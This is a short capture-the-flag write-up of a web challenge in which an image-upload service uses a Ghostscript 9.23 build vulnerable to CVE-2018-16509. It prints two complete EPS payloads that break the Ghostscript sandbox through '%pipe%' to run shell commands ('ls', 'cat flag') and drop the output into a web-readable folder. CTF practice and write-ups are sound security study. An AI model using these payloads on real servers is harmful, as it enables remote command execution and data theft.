---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Web: petpet rcbee

The webpage allows for uploading an image

By scanning the source, we see that the files are filtered based on extenison

```
ALLOWED_EXTENSIONS = set(['png', 'jpg', 'jpeg'])

def petpet(file):

    if not allowed_file(file.filename):
        return {'status': 'failed', 'message': 'Improper filename'}, 400
```

In the dockerfile, there is:

```
# Install Pillow component
RUN curl -L -O https://github.com/ArtifexSoftware/ghostpdl-downloads/releases/download/gs923/ghostscript-9.23-linux-x86_64.tgz \
    && tar -xzf ghostscript-9.23-linux-x86_64.tgz \
    && mv ghostscript-9.23-linux-x86_64/gs-923-linux-x86_64 /usr/local/bin/gs && rm -rf /tmp/ghost*
```

This version of ghostscript is vulnerable **Python PIL/Pillow Remote Shell Command Execution via Ghostscript CVE-2018-16509** https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509

It is triggered if `Image.open()` is called, which is

## Payload

Based on the [CVE](https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509), we create payload

```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%ls > /app/application/static/petpets/pwn.txt) currentdevice putdeviceprops
```

That creates a static file, which can be read by the webserver. Uploading it, we can see the result of the command.

So we go for the flag

```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%cat flag > /app/application/static/petpets/pwn.txt) currentdevice putdeviceprops
```